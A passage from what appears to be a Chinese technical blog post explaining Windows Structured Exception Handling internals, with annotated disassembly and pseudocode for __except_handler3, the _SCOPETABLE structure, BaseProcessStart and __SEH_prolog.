ebp</span><br><span class="line"><span class="number">7</span>C839AFA    cld                   ; Clear Direction Flag</span><br><span class="line"><span class="number">7</span>C839AFB    mov   ebx, [ebp+pRegistrationFrame]</span><br><span class="line"><span class="number">7</span>C839AFE    mov   eax, [ebp+pExceptionRecord]</span><br><span class="line"><span class="number">7</span>C839B01    test  dword ptr [eax+<span class="number">4</span>], <span class="number">6</span> ;<span class="keyword">if</span>(pExceptionRecord-&gt;ExceptionFlags &amp;</span><br><span class="line"><span class="number">7</span>C839B01 ;EXCEPTION_UNWIND_CONTEXT) </span><br><span class="line"><span class="number">7</span>C839B01 ;<span class="keyword">goto</span> loc_7C839BB9</span><br><span class="line"><span class="number">7</span>C839B01                                 ;EXCEPTION_UNWIND_CONTEXT在exsup.inc中定义</span><br><span class="line"><span class="number">7</span>C839B08    jnz   loc_7C839BB9</span><br><span class="line"><span class="number">7</span>C839B0E    mov   [ebp+exceptPtrs], eax;exceptPtrs-&gt;ExceptionRecord=pExceptionRecord</span><br><span class="line"><span class="number">7</span>C839B11    mov   eax, [ebp+pContextRecord]</span><br><span class="line"><span class="number">7</span>C839B14    mov   [ebp+var_4], eax ;exceptPtrs-&gt;ContextRecord=pContextRecord</span><br><span class="line"><span class="number">7</span>C839B17    lea   eax, [ebp+exceptPtrs]</span><br><span class="line"><span class="number">7</span>C839B1A    mov   [ebx<span class="number">-4</span>], eax    ;(PEXCEPTION_POINTERS)((DWORD)pRegistrationFrame<span class="number">-4</span>)=xpointers</span><br><span class="line"><span class="number">7</span>C839B1D    mov   esi, [ebx+<span class="number">0</span>Ch]  ;esi=pRegistrationFrame-&gt;trylevel</span><br><span class="line"><span class="number">7</span>C839B20    mov   edi, [ebx+<span class="number">8</span>]    ;edi=pRegistrationFrame-&gt;_SCOPETABLE</span><br><span class="line"><span class="number">7</span>C839B23    push  ebx</span><br><span class="line"><span class="number">7</span>C839B24    call  __ValidateEH3RN</span><br><span class="line"><span class="number">7</span>C839B29    add   esp, <span class="number">4</span></span><br><span class="line"><span class="number">7</span>C839B2C    <span class="keyword">or</span>    eax, eax</span><br><span class="line"><span class="number">7</span>C839B2E    jz    <span class="keyword">short</span> loc_7C839BAB</span><br><span class="line"><span class="number">7</span>C839B30</span><br><span class="line"><span class="number">7</span>C839B30 loc_7C839B30:                 ;CODE XREF: __except_handler3+B2j</span><br><span class="line"><span class="number">7</span>C839B30    cmp   esi, <span class="number">0F</span>FFFFFFFh    ;<span class="keyword">if</span>(pRegistrationFrame-&gt;trylevel==<span class="number">0xFFFFFFFF</span>) <span class="keyword">goto</span> loc_7C839BB2</span><br><span class="line"><span class="number">7</span>C839B33    jz    <span class="keyword">short</span> loc_7C839BB2 ;当前异常帧中所有__try/__except(嵌套)遍历完毕,跳走!</span><br><span class="line"><span class="number">7</span>C839B33                             ;注：一个函数仅有一个异常帧,__try/__except嵌套也只产生一个异常帧</span><br><span class="line"><span class="number">7</span>C839B35    lea   ecx, [esi+esi*<span class="number">2</span>]</span><br><span class="line"><span class="number">7</span>C839B38    mov   eax, [edi+ecx*<span class="number">4</span>+<span class="number">4</span>] ;eax=pRegistrationFrame-&gt;_SCOPETABLE[trylevel].lpfnFilter</span><br><span class="line"><span class="number">7</span>C839B3C    <span class="keyword">or</span>    eax, eax</span><br><span class="line"><span class="number">7</span>C839B3E    jz    <span class="keyword">short</span> loc_7C839B99 ;<span class="keyword">if</span>(lpfnFilter == <span class="literal">NULL</span>) <span class="keyword">goto</span> loc_7C839B99</span><br><span class="line"><span class="number">7</span>C839B40    push  esi</span><br><span class="line"><span class="number">7</span>C839B41    push  ebp                ;保存当前ebp</span><br><span class="line"><span class="number">7</span>C839B42    lea   ebp, [ebx+<span class="number">10</span>h]     ;切换ebp,为lpfnFilter调用做准备</span><br><span class="line"><span class="number">7</span>C839B45    <span class="keyword">xor</span>   ebx, ebx</span><br><span class="line"><span class="number">7</span>C839B47    <span class="keyword">xor</span>   ecx, ecx</span><br><span class="line"><span class="number">7</span>C839B49    <span class="keyword">xor</span>   edx, edx</span><br><span class="line"><span class="number">7</span>C839B4B    <span class="keyword">xor</span>   esi, esi</span><br><span class="line"><span class="number">7</span>C839B4D    <span class="keyword">xor</span>   edi, edi</span><br><span class="line"><span class="number">7</span>C839B4F    call  eax                ;call lpfnFilter</span><br><span class="line"><span class="number">7</span>C839B51    pop   ebp                ;恢复当前ebp</span><br><span class="line"><span class="number">7</span>C839B52    pop   esi</span><br><span class="line"><span class="number">7</span>C839B53    mov   ebx, [ebp+pRegistrationFrame]</span><br><span class="line"><span class="number">7</span>C839B56    <span class="keyword">or</span>    eax, eax           ;检查lpfnFilter返回值.</span><br><span class="line"><span class="number">7</span>C839B58    jz    <span class="keyword">short</span> loc_7C839B99 ;<span class="keyword">if</span>(eax==EXCEPTION_CONTINUE_SEARCH) <span class="keyword">goto</span> loc_7C839B99</span><br><span class="line"><span class="number">7</span>C839B5A    js    <span class="keyword">short</span> loc_7C839BA4 ;<span class="keyword">if</span>(eax==EXCEPTION_CONTINUE_EXECUTION) <span class="keyword">goto</span> loc_7C839BA4</span><br><span class="line"><span class="number">7</span>C839B5C    mov   edi, [ebx+<span class="number">8</span>]       ;<span class="keyword">if</span>(eax==EXCEPTION_EXECUTE_HANDLER) <span class="keyword">goto</span> <span class="number">7</span>C839B5F</span><br><span class="line"><span class="number">7</span>C839B5F    push  ebx</span><br><span class="line"><span class="number">7</span>C839B60    call  __global_unwind2   ;全局展开</span><br><span class="line"><span class="number">7</span>C839B65    add   esp, <span class="number">4</span></span><br><span class="line"><span class="number">7</span>C839B68    lea   ebp, [ebx+<span class="number">10</span>h]     ;切换ebp,注意之前没有保存当前ebp.</span><br><span class="line"><span class="number">7</span>C839B6B    push  esi</span><br><span class="line"><span class="number">7</span>C839B6C    push  ebx</span><br><span class="line"><span class="number">7</span>C839B6D    call  __local_unwind2    ;局部展开</span><br><span class="line"><span class="number">7</span>C839B72    add   esp, <span class="number">8</span></span><br><span class="line"><span class="number">7</span>C839B75    lea   ecx, [esi+esi*<span class="number">2</span>]</span><br><span class="line"><span class="number">7</span>C839B78    push  <span class="number">1</span></span><br><span class="line"><span class="number">7</span>C839B7A    mov   eax, [edi+ecx*<span class="number">4</span>+<span class="number">8</span>]</span><br><span class="line"><span class="number">7</span>C839B7E    call  __NLG_Notify</span><br><span class="line"><span class="number">7</span>C839B83    mov   eax, [edi+ecx*<span class="number">4</span>]   ;eax = =pRegistrationFrame-&gt;_SCOPETABLE[trylevel].prelevel</span><br><span class="line"><span class="number">7</span>C839B86    mov   [ebx+<span class="number">0</span>Ch], eax     ;pRegistrationFrame-&gt;trylevel=eax</span><br><span class="line"><span class="number">7</span>C839B89    mov   eax, [edi+ecx*<span class="number">4</span>+<span class="number">8</span>] ;eax=pRegistrationFrame-&gt;_SCOPETABLE[trylevel].lpfnHandler</span><br><span class="line"><span class="number">7</span>C839B8D    <span class="keyword">xor</span>   ebx, ebx</span><br><span class="line"><span class="number">7</span>C839B8F    <span class="keyword">xor</span>   ecx, ecx</span><br><span class="line"><span class="number">7</span>C839B91    <span class="keyword">xor</span>   edx, edx</span><br><span class="line"><span class="number">7</span>C839B93    <span class="keyword">xor</span>   esi, esi</span><br><span class="line"><span class="number">7</span>C839B95    <span class="keyword">xor</span>   edi, edi</span><br><span class="line"><span class="number">7</span>C839B97    call  eax             ;call lpfnHandler 不再返回!</span><br><span class="line"><span class="number">7</span>C839B99</span><br><span class="line"><span class="number">7</span>C839B99 loc_7C839B99:            ;CODE XREF: __except_handler3+<span class="number">4</span>Ej</span><br><span class="line"><span class="number">7</span>C839B99                          ;__except_handler3+<span class="number">68</span>j</span><br><span class="line"><span class="number">7</span>C839B99    mov   edi, [ebx+<span class="number">8</span>]    ;lpfnFilter返回EXCEPTION_CONTINUE_SEARCH的情况下</span><br><span class="line"><span class="number">7</span>C839B99                          ;edi=pRegistrationFrame-&gt;_SCOPETABLE</span><br><span class="line"><span class="number">7</span>C839B9C    lea   ecx, [esi+esi*<span class="number">2</span>]</span><br><span class="line"><span class="number">7</span>C839B9F    mov   esi, [edi+ecx*<span class="number">4</span>];esi=pRegistrationFrame-&gt;_SCOPETABLE[trylevel].prevlevel</span><br><span class="line"><span class="number">7</span>C839BA2    jmp   <span class="keyword">short</span> loc_7C839B30</span><br><span class="line"><span class="number">7</span>C839BA4 ; ---------------------------------------------------------------------------</span><br><span class="line"><span class="number">7</span>C839BA4</span><br><span class="line"><span class="number">7</span>C839BA4 loc_7C839BA4:            ;CODE XREF: __except_handler3+<span class="number">6</span>Aj</span><br><span class="line"><span class="number">7</span>C839BA4    mov   eax, <span class="number">0</span>          ;eax=ExceptionContinueExecution</span><br><span class="line"><span class="number">7</span>C839BA9    jmp   <span class="keyword">short</span> loc_7C839BCE ; 退出</span><br><span class="line"><span class="number">7</span>C839BAB ; ---------------------------------------------------------------------------</span><br><span class="line"><span class="number">7</span>C839BAB</span><br><span class="line"><span class="number">7</span>C839BAB loc_7C839BAB:      ;CODE XREF: __except_handler3+<span class="number">3</span>Ej</span><br><span class="line"><span class="number">7</span>C839BAB    mov   eax, [ebp+pExceptionRecord]</span><br><span class="line"><span class="number">7</span>C839BAE    <span class="keyword">or</span>    dword ptr [eax+<span class="number">4</span>], <span class="number">8</span></span><br><span class="line"><span class="number">7</span>C839BB2</span><br><span class="line"><span class="number">7</span>C839BB2 loc_7C839BB2:      ;CODE XREF: __except_handler3+<span class="number">43</span>j</span><br><span class="line"><span class="number">7</span>C839BB2    mov   eax, <span class="number">1</span>    ;<span class="number">7</span>C839BAB ~ <span class="number">7</span>C839BB7的分析</span><br><span class="line"><span class="number">7</span>C839BB2                    ;<span class="keyword">if</span>(pExceptionRecord-&gt;ExceptionFlags==EXCEPTION_STACK_INVALID)&#123;</span><br><span class="line"><span class="number">7</span>C839BB2                    ;    eax = ExceptionContinueSearch</span><br><span class="line"><span class="number">7</span>C839BB2                    ;    <span class="keyword">goto</span> loc_7C839BCE</span><br><span class="line"><span class="number">7</span>C839BB2                    ;&#125;</span><br><span class="line"><span class="number">7</span>C839BB7    jmp   <span class="keyword">short</span> loc_7C839BCE ; 退出</span><br><span class="line"><span class="number">7</span>C839BB9 ; ---------------------------------------------------------------------------</span><br><span class="line"><span class="number">7</span>C839BB9</span><br><span class="line"><span class="number">7</span>C839BB9 loc_7C839BB9:            ; CODE XREF: __except_handler3+<span class="number">18</span>j</span><br><span class="line"><span class="number">7</span>C839BB9    push  ebp             ; 保存当前ebp</span><br><span class="line"><span class="number">7</span>C839BBA    lea   ebp, [ebx+<span class="number">10</span>h]  ; 切换ebp</span><br><span class="line"><span class="number">7</span>C839BBD    push  <span class="number">0F</span>FFFFFFFh</span><br><span class="line"><span class="number">7</span>C839BBF    push  ebx</span><br><span class="line"><span class="number">7</span>C839BC0    call  __local_unwind2 ; 局部展开</span><br><span class="line"><span class="number">7</span>C839BC5    add   esp, <span class="number">8</span></span><br><span class="line"><span class="number">7</span>C839BC8    pop   ebp             ; 恢复当前ebp</span><br><span class="line"><span class="number">7</span>C839BC9    mov   eax, <span class="number">1</span>          ; eax = ExceptionContinueSearch</span><br><span class="line"><span class="number">7</span>C839BCE</span><br><span class="line"><span class="number">7</span>C839BCE loc_7C839BCE:            ; CODE XREF: __except_handler3+B9j</span><br><span class="line"><span class="number">7</span>C839BCE                          ; __except_handler3+C7j</span><br><span class="line"><span class="number">7</span>C839BCE    pop   ebp</span><br><span class="line"><span class="number">7</span>C839BCF    pop   edi</span><br><span class="line"><span class="number">7</span>C839BD0    pop   esi</span><br><span class="line"><span class="number">7</span>C839BD1    pop   ebx</span><br><span class="line"><span class="number">7</span>C839BD2    mov   esp, ebp</span><br><span class="line"><span class="number">7</span>C839BD4    pop   ebp</span><br><span class="line"><span class="number">7</span>C839BD5    retn</span><br><span class="line"><span class="number">7</span>C839BD5 __except_handler3 endp</span><br></pre></td></tr></table></figure><p>上面<code>__except_handler3</code>的汇编代码写成伪代码如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// VC++扩展的SEH的异常帧结构 </span></span><br><span class="line"><span class="comment">// [ebp-14];PEXCEPTION_POINTERS xpointers;   </span></span><br><span class="line"><span class="comment">//         ;struct _EXCEPTION_REGISTRATION&#123;   </span></span><br><span class="line"><span class="comment">// [ebp-10];     struct _EXCEPTION_REGISTRATION *prev;   </span></span><br><span class="line"><span class="comment">// [ebp-0C];     _except_handler handler;   </span></span><br><span class="line"><span class="comment">// [ebp-08];     struct _SCOPETABLE_entry *_SCOPETABLE;   </span></span><br><span class="line"><span class="comment">// [ebp-04];     int trylevel;   </span></span><br><span class="line"><span class="comment">// [ebp-00];     int _ebp;   </span></span><br><span class="line"><span class="comment">//         ;&#125;; </span></span><br><span class="line"><span class="comment">//   </span></span><br><span class="line"><span class="comment">// typedef enum _EXCEPTION_DISPOSITION &#123;</span></span><br><span class="line"><span class="comment">//     ExceptionContinueExecution,</span></span><br><span class="line"><span class="comment">//     ExceptionContinueSearch,</span></span><br><span class="line"><span class="comment">//     ExceptionNestedException,</span></span><br><span class="line"><span class="comment">//     ExceptionCollidedUnwind</span></span><br><span class="line"><span class="comment">// &#125; EXCEPTION_DISPOSITION;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// _except_handler定义   </span></span><br><span class="line"><span class="comment">// typedef EXCEPTION_DISPOSITION __cdecl (*_except_handler)(   </span></span><br><span class="line"><span class="comment">//       _In_ struct _EXCEPTION_RECORD *_ExceptionRecord,   </span></span><br><span class="line"><span class="comment">//       _In_ void * _EstablisherFrame,   </span></span><br><span class="line"><span class="comment">//       _Inout_ struct _CONTEXT *_ContextRecord,   </span></span><br><span class="line"><span class="comment">//       _Inout_ void * _DispatcherContext   </span></span><br><span class="line"><span class="comment">// );   </span></span><br><span class="line"><span class="comment">//   </span></span><br><span class="line"><span class="comment">//   </span></span><br><span class="line"><span class="comment">// _SCOPETABLE_entry定义   </span></span><br><span class="line"><span class="comment">// struct _SCOPETABLE_entry&#123;   </span></span><br><span class="line"><span class="comment">//    DWORD prevtrylevel;   </span></span><br><span class="line"><span class="comment">//    PVOID lpfnFilter;   </span></span><br><span class="line"><span class="comment">//    PVOID lpfnHandler;   </span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">EXCEPTION_DISPOSITION __cdecl __except_handler3 (</span><br><span class="line">    _In_ struct _EXCEPTION_RECORD *pExceptionRecord,</span><br><span class="line">    _In_ struct _EXCEPTION_REGISTRATION* pRegistrationFrame,</span><br><span class="line">    _Inout_ struct _CONTEXT *pContextRecord,</span><br><span class="line">    _Inout_ <span class="keyword">void</span> * pDispatcherContext</span><br><span class="line">    ) &#123;</span><br><span class="line">    </span><br><span class="line">EXCEPTION_POINTERS exceptPtrs;</span><br><span class="line">DWORD dwTryLevel,dwRetFilter;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//方向标志复位</span></span><br><span class="line">__asm cld</span><br><span class="line"><span class="comment">// 如果没有设置EXCEPTION_UNWINDING标志或EXCEPTION_EXIT_UNWIND标志</span></span><br><span class="line">    <span class="comment">// 表明这是第一次调用这个处理程序（也就是说，并没有处于异常展开阶段）</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span>(!(pExceptionRecord-&gt;ExceptionFlags &amp; EXCEPTION_UNWIND_CONTEXT)) &#123;</span><br><span class="line">        <span class="comment">//在栈上创建EXCEPTION_POINTERS结构，并使用两个参数将其初始化</span></span><br><span class="line">exceptPtrs-&gt;ExceptionRecord = pExceptionRecord;</span><br><span class="line">exceptPtrs-&gt;ContextRecord = pContextRecord;</span><br><span class="line"></span><br><span class="line"><span class="comment">//提供VC++扩展的异常处理帧结构中的[ebp-14]值</span></span><br><span class="line"><span class="comment">//内联函数GetExceptionInformation将从[ebp-14]提取信息</span></span><br><span class="line">(PEXCEPTION_POINTERS)((DWORD)pRegistrationFrame<span class="number">-4</span>)= &amp;exceptPtrs;</span><br><span class="line"></span><br><span class="line"><span class="comment">//验证SEH异常帧</span></span><br><span class="line"><span class="keyword">if</span>(__ValidateEH3RN(pRegistrationFrame)) &#123;</span><br><span class="line"><span class="comment">//一个函数仅有一个异常帧,一个函数可以有多个__try/__except结构</span></span><br><span class="line"><span class="comment">//嵌套的__try/__except通过_SCOPETABLE-&gt;prevtrylevel关联起来</span></span><br><span class="line"><span class="comment">//向上搜索当前异常帧中嵌套的__try/__except过滤函数和处理函数</span></span><br><span class="line">dwTryLevel = pRegistrationFrame-&gt;trylevel;</span><br><span class="line"><span class="keyword">while</span>(dwTryLevel != <span class="number">0xFFFFFFFF</span>) &#123;</span><br><span class="line"><span class="comment">//不存在过滤函数,继续向上一层__try/__except搜索</span></span><br><span class="line"><span class="keyword">if</span>(!pRegistrationFrame-&gt;_SCOPETABLE[dwTryLevel].lpfnFilter) &#123;</span><br><span class="line">dwTryLevel = pRegistrationFrame-&gt;_SCOPETABLE[dwTryLevel].prevtrylevel;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//保存当前ebp</span></span><br><span class="line">__asm push ebp</span><br><span class="line"><span class="comment">//切换ebp回lpfnFilter所在位置</span></span><br><span class="line">__asm lea ebp,&amp;pRegistrationFrame-&gt;_ebp;</span><br><span class="line"><span class="comment">//调用过滤函数</span></span><br><span class="line">dwRetFilter = pRegistrationFrame-&gt;_SCOPETABLE[dwTryLevel].lpfnFilter();</span><br><span class="line"><span class="comment">//恢复当前ebp</span></span><br><span class="line">__asm pop ebp</span><br><span class="line"><span class="comment">//检查过滤函数的返回值</span></span><br><span class="line"><span class="keyword">if</span>(dwRetFilter == EXCEPTION_CONTINUE_SEARCH) &#123;</span><br><span class="line">dwTryLevel = pRegistrationFrame-&gt;_SCOPETABLE[dwTryLevel].prevtrylevel;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(dwRetFilter == EXCEPTION_CONTINUE_EXECUTION) &#123;</span><br><span class="line"><span class="comment">//异常已经修复,重新执行引发异常的指令</span></span><br><span class="line"><span class="keyword">return</span> ExceptionContinueExecution;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//找到__except(EXCEPTION_EXECUTE_HANDLER)</span></span><br><span class="line"><span class="comment">//全局展开</span></span><br><span class="line">__global_unwind2(pRegistrationFrame);</span><br><span class="line"><span class="comment">//切换ebp,注意:之前没有保存当前ebp</span></span><br><span class="line">__asm lea ebp,&amp;pRegistrationFrame-&gt;_ebp; </span><br><span class="line"><span class="comment">//对当前__try/__except进行局部展开</span></span><br><span class="line">__local_unwind2(pRegistrationFrame,dwTryLevel);</span><br><span class="line"><span class="comment">//作用未知!</span></span><br><span class="line">__NLG_Notify(<span class="number">1</span>);</span><br><span class="line"><span class="comment">//把异常帧的trylevel设置成__except(EXCEPTION_EXECUTE_HANDLER)</span></span><br><span class="line"><span class="comment">//的上一个__try/__except</span></span><br><span class="line">pRegistrationFrame-&gt;trylevel = </span><br><span class="line">pRegistrationFrame-&gt;_SCOPETABLE[dwTryLevel].prevtrylevel;</span><br><span class="line"><span class="comment">//调用__except &#123;&#125;块，这个调用并不会返回</span></span><br><span class="line">pRegistrationFrame-&gt;_SCOPETABLE[dwTryLevel].lpfnHandler();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//当前异常帧搜索结束,但仍然没有找到__except(EXCEPTION_EXECUTE_HANDLER)</span></span><br><span class="line"><span class="comment">//向下一个异常帧搜索,也就是向__except_handler3的调用函数搜索异常帧</span></span><br><span class="line"><span class="keyword">return</span> ExceptionContinueSearch;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//异常帧的栈无效</span></span><br><span class="line"><span class="comment">//向下一个异常帧搜索,也就是向__except_handler3的调用函数搜索异常帧</span></span><br><span class="line"><span class="keyword">if</span>(pExceptionRecord-&gt;ExceptionFlags==EXCEPTION_STACK_INVALID) &#123;</span><br><span class="line"><span class="keyword">return</span> ExceptionContinueSearch;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//保存当前ebp</span></span><br><span class="line">__asm push ebp</span><br><span class="line"><span class="comment">//切换ebp回引发异常的函数</span></span><br><span class="line">__asm lea,&amp;pRegistrationFrame-&gt;_ebp;</span><br><span class="line"><span class="comment">//对引发异常的函数进行局部展开</span></span><br><span class="line">__local_unwind2(pRegistrationFrame,<span class="number">0xFFFFFFFF</span>);</span><br><span class="line"><span class="comment">//恢复当前ebp</span></span><br><span class="line">__asm pop ebp</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ExceptionContinueSearch;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上面的伪代码可以得知，<code>__except_handler3</code>大体上由两部分组成。这个函数可以在两种情况下被调用，一种是正常（非展开阶段）的回调，另一中是在展开阶段。其中大部分是在非展开阶段的回调。</p><p><code>__except_handler3</code>首先在栈上创建了一个<code>EXCEPTION_POINTERS</code>结构并将其初始化。<code>__except_handler3</code>从<code>_EXCEPTION_REGISTRATION</code>帧中获取当前的<code>trylevel</code>（在[ebp-04h]处）。顾名思义<code>trylevel</code>成员是<code>_SCOPETABLE</code>数组的索引（VC++为每个函数内的所有<code>__try</code>块建立一个<code>_SCOPETABLE</code>表,其中每个<code>__try</code>块对应于<code>_SCOPETABLE</code>中的一项。）而正是这个数组才使得一个函数中的多个<code>__try</code>块和嵌套的<code>__try</code>块能够仅使用一个<code>_EXCEPTION_REGISTRATION</code>结构。如果<code>trylevel</code>的值为0xFFFFFFFF，标志这个链表结束。</p><h3 id="SCOPETABLE"><a href="#SCOPETABLE" class="headerlink" title="_SCOPETABLE"></a>_SCOPETABLE</h3><p>每个<code>_SCOPETABLE</code>结构如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">SCOPETABLE</span>&#123;</span></span><br><span class="line">    DWORD previousTryLevel;<span class="comment">//用于嵌套的__try块</span></span><br><span class="line">    DWORD lpfnFilter;<span class="comment">//异常过滤器表达式的地址</span></span><br><span class="line">    DWORD lpfnHandler;<span class="comment">//异常处理函数地址（__except块的地址）</span></span><br><span class="line">&#125; _SCOPETABLE, *P_SCOPETABLE;</span><br></pre></td></tr></table></figure><p><code>_SCOPETABLE</code>第3个成员<code>lpfnHandler</code>是指向异常处理函数的指针；第2个成员<code>lpfnFilter</code>是指向异常过滤器表达式的指针；第1个成员<code>previousTryLevel</code>稍微复杂了点，我们知道<code>trylevel</code>指定了使用<code>_SCOPETABLE</code>数组当中的哪一个元素，其实也就是指定了使用哪一个异常过滤器表达式和<code>__except</code>块，但如果嵌套了多个<code>__try/__except</code>块，处理当前异常的<code>__except</code>块处于外层，那么<code>__except_handler3</code>如何知道<code>_SCOPETABLE</code>数组的哪个元素对应于外层的<code>__try</code>块的呢？</p><p>答案就是该<code>_SCOPETABLE</code>元素的第一个成员<code>previousTryLevel</code>。外层的<code>__try</code>块的索引由成员<code>previousTryLevel</code>给出。</p><p><code>__except_handler3</code>获取了当前<code>trylevel</code>，就调用对应的<code>_SCOPETABLE</code>的异常过滤器表达式，如果异常过滤器表达式返回<code>EXCEPTION_CONTINUE_SEARCH</code>，<code>__except_handler3</code>根据当前元素的<code>previousTryLevel</code>域移向下一个<code>__try</code>块，如果遍历完整个链表都没有找到处理该异常的代码，<code>__except_handler3</code>返回<code>ExceptionContinueSearch</code>（注意不要把<code>EXCEPTION_CONTINUE_SEARCH</code>和<code>ExceptionContinueSearch</code>弄混了，前者是异常过滤器表达式返回的值，而后者是<code>__except__handler</code>返回的值），这导致系统移向下一个<code>EXCEPTION_REGISTRATION</code>帧（这个链表是由于函数嵌套调用而形成的）。如果异常过滤器表达式返回<code>EXCEPTION_EXECUTE_HANDLER</code>，表明执行流到对应的<code>__except</code>块处理，同时所有前面的<code>EXCEPTION_REGISTRATION</code>帧从链表中移除。</p><p>现在又有个问题，如果遍历完链表都没有找到一个可以处理这个异常的程序怎么办？</p><h1 id="BaseProcessStart"><a href="#BaseProcessStart" class="headerlink" title="BaseProcessStart"></a>BaseProcessStart</h1><p>其实在线程执行的早期，操作系统会为每个线程提供一个默认的异常处理程序。这个程序总是链表的最后一个结点，且它总是选择处理异常。</p><p><code>BaseProcessStart</code>是Windows NT KERNEL32.DLL的一个内部例程。唯一个参数便是线程入口地址。<code>BaseProcessStart</code>运行在新进程的环境中，它调用这个进程第一个线程的入口函数。</p><p>Kernel32.dll!BaseProcessStart汇编代码如下:</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">7</span>C817054 ; <span class="function">__stdcall <span class="title">BaseProcessStart</span><span class="params">(x)</span></span></span><br><span class="line">7C817054 _BaseProcessStart@4 proc near ; CODE XREF: BaseProcessStartThunk(x,x)+5j</span><br><span class="line"><span class="number">7</span>C817054</span><br><span class="line"><span class="number">7</span>C817054 ms_exc = VC_EXCEPTION_REGISTRATION ptr <span class="number">-18</span>h;VC_EXCEPTION_REGISTRATION是Visual C++经过扩展过后的异常处理帧</span><br><span class="line"><span class="number">7</span>C817054 arg_0  = dword ptr  <span class="number">8</span></span><br><span class="line"><span class="number">7</span>C817054</span><br><span class="line"><span class="number">7</span>C817054        push    <span class="number">0</span>Ch  ;在__SEH_prolog中被更改为EBP</span><br><span class="line"><span class="number">7</span>C817056        push    offset stru_7C817080 ;暂时把_SCOPETABLE保存在这里</span><br><span class="line"><span class="number">7</span>C81705B        call    __SEH_prolog    ;设置EBP,安装新的SEH</span><br><span class="line"><span class="number">7</span>C817060        <span class="keyword">and</span>     [ebp+ms_exc.disabled], <span class="number">0</span>;这时的EBP已经指向<span class="number">7</span>C817054所在位置</span><br><span class="line"><span class="number">7</span>C817064        push    <span class="number">4</span>               ;push入口函数所在地址所占的空间大小</span><br><span class="line"><span class="number">7</span>C817066        lea     eax, [ebp+arg_0];入口函数所在地址赋给eax寄存器</span><br><span class="line"><span class="number">7</span>C817069        push    eax;push入口函数所在地址</span><br><span class="line"><span class="number">7</span>C81706A        push    <span class="number">9</span>               ;push查询并设置线程的入口函数</span><br><span class="line"><span class="number">7</span>C81706C        push    <span class="number">0F</span>FFFFFFEh      ;<span class="function">push<span class="title">GetCurrentThread</span><span class="params">()</span></span></span><br><span class="line">7C81706E        call    ds:__imp__NtSetInformationThread@16 </span><br><span class="line">    ;设置线程的入口点函数为mainCRTStartup</span><br><span class="line"><span class="number">7</span>C817074        call    [ebp+arg_0]     ;调用mainCRTStartup</span><br><span class="line"><span class="number">7</span>C817077        push    eax             ;dwExitCode</span><br><span class="line"><span class="number">7</span>C817078</span><br><span class="line"><span class="number">7</span>C817078 loc_7C817078:                  ;CODE XREF: .text:<span class="number">7</span>C84390Dj</span><br><span class="line"><span class="number">7</span>C817078        call    _ExitThread@<span class="number">4</span>   ;退出线程</span><br><span class="line"><span class="number">7</span>C817078 _BaseProcessStart@<span class="number">4</span> endp</span><br></pre></td></tr></table></figure><p>写成伪代码大概如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ThreadQuerySetWin32StartAddress9</span></span><br><span class="line"><span class="function">__stdcall <span class="title">BaseProcessStart</span><span class="params">(LPVOID lpfnEntryPoint)</span> </span>&#123;</span><br><span class="line">DWORD retValue = <span class="number">0</span>;</span><br><span class="line">__try &#123;</span><br><span class="line"><span class="comment">//将主线程的入口函数设置为mainCRTStartup</span></span><br><span class="line">NtSetInformationThread(GetCurrentThread(),ThreadQuerySetWin32StartAddress,</span><br><span class="line">&amp;lpfnEntryPoint,<span class="keyword">sizeof</span>(lpfnEntryPoint));</span><br><span class="line">retValue = lpfnEntryPoint();</span><br><span class="line">&#125;</span><br><span class="line">__except(<span class="comment">/*异常处理过滤器代码*/</span>) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="SEH-prolog"><a href="#SEH-prolog" class="headerlink" title="__SEH_prolog"></a>__SEH_prolog</h2><p><code>__SEH_prolog</code>函数的作用是安装新的SEH，设置ebp，<code>__SEH_prolog</code>的汇编代码如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">7</span>C8024D6 __SEH_prolog    proc near               ; CODE XREF: DeviceIoControl(x,x,x,x,x,x,x,x)+<span class="number">7</span>p</span><br><span class="line"><span class="number">7</span>C8024D6                                         ; ReadFile(x,x,x,x,x)+<span class="number">7</span>p ...</span><br><span class="line"><span class="number">7</span>C8024D6</span><br><span class="line"><span class="number">7</span>C8024D6 arg_4 = dword ptr  <span class="number">8</span></span><br><span class="line"><span class="number">7</span>C8024D6</span><br><span class="line"><span class="number">7</span>C8024D6       push    offset __except_handler3</span><br><span class="line"><span class="number">7</span>C8024DB       mov     eax, large fs:<span class="number">0</span></span><br><span class="line"><span class="number">7</span>C8024E1       push    eax               ; prev</span><br><span class="line"><span class="number">7</span>C8024E2       mov     eax, [esp+<span class="number">8</span>+arg_4] ; eax=<span class="number">0</span>ch</span><br><span class="line"><span class="number">7</span>C8024E6       mov     [esp+<span class="number">8</span>+arg_4], ebp ; 保存原先EBP.</span><br><span class="line"><span class="number">7</span>C8024EA       lea     ebp, [esp+<span class="number">8</span>+arg_4] ; 设置新的EBP</span><br><span class="line">  ; 也就是设置到BaseProcessStart中push <span class="number">0</span>ch所在的栈位置</span><br><span 